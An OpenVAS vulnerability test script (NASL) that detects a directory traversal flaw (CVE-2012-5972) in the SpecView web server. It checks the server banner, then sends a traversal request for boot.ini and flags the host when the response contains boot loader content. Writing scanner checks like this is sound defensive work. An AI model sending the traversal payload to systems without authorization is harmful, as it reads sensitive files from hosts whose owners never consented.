###############################################################################
# OpenVAS Vulnerability Test
# $Id: gb_SpecView_54243.nasl 9352 2018-04-06 07:13:02Z cfischer $
#
# SpecView Web Server Directory Traversal Vulnerability
#
# Authors:
# Michael Meyer <michael.meyer@greenbone.net>
#
# Copyright:
# Copyright (c) 2012 Greenbone Networks GmbH
#
# This program is free software; you can redistribute it and/or
# modify it under the terms of the GNU General Public License
# as published by the Free Software Foundation; either version 2
# of the License, or (at your option) any later version.
#
# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with this program; if not, write to the Free Software
# Foundation, Inc., 51 Franklin St, Fifth Floor, Boston, MA 02110-1301 USA.
###############################################################################

tag_summary = "SpecView is prone to a directory-traversal vulnerability because it
fails to properly sanitize user-supplied input.

Remote attackers can use specially crafted requests with directory-
traversal sequences ('../') to retrieve arbitrary files in the context
of the application.

Exploiting this issue may allow an attacker to obtain sensitive
information that could aid in further attacks.";


if (description)
{
 script_oid("1.3.6.1.4.1.25623.1.0.103506");
 script_bugtraq_id(54243);
 script_cve_id("CVE-2012-5972");
 script_tag(name:"cvss_base", value:"5.0");
 script_tag(name:"cvss_base_vector", value:"AV:N/AC:L/Au:N/C:P/I:N/A:N");
 script_version ("$Revision: 9352 $");

 script_name("SpecView Web Server Directory Traversal Vulnerability");

 script_xref(name : "URL" , value : "http://www.securityfocus.com/bid/54243");

 script_tag(name:"last_modification", value:"$Date: 2018-04-06 09:13:02 +0200 (Fri, 06 Apr 2018) $");
 script_tag(name:"creation_date", value:"2012-07-02 12:15:35 +0200 (Mon, 02 Jul 2012)");
 script_category(ACT_ATTACK);
  script_tag(name:"qod_type", value:"remote_vul");
 script_family("Web application abuses");
 script_copyright("This script is Copyright (C) 2012 Greenbone Networks GmbH");
 script_dependencies("gb_get_http_banner.nasl");
 script_require_ports("Services/www", 80);
 script_mandatory_keys("SpecView/banner");

 script_tag(name : "summary" , value : tag_summary);
 exit(0);
}

include("http_func.inc");
include("host_details.inc");
include("http_keepalive.inc");
include("global_settings.inc");
   
port = get_http_port(default:80);
if(!get_port_state(port))exit(0);

banner = get_http_banner(port:port);
if("SpecView" >!< banner)exit(0);

url = '/.../.../.../.../.../.../boot.ini'; 

if(http_vuln_check(port:port, url:url,pattern:"\[boot loader\]")) {
     
  security_message(port:port);
  exit(0);

}

exit(0);
